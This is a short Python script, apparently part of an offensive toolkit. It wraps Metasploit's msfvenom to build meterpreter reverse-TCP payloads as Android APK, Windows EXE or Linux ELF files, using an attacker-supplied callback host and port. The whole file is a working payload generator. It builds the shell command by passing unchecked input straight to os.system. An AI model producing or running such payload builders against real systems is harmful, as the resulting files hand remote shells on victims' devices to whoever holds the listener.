import os

def generate_payload(platform, lhost, lport, outfile):
    payloads = {
        "android": "android/meterpreter/reverse_tcp",
        "windows": "windows/meterpreter/reverse_tcp",
        "linux": "linux/x86/meterpreter/reverse_tcp"
    }
    formats = {
        "android": "apk",
        "windows": "exe",
        "linux": "elf"
    }

    payload = payloads.get(platform)
    outformat = formats.get(platform)
    full_outfile = f"{outfile}.{outformat}"

    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {outformat} -o {full_outfile}")
    return payload, outformat
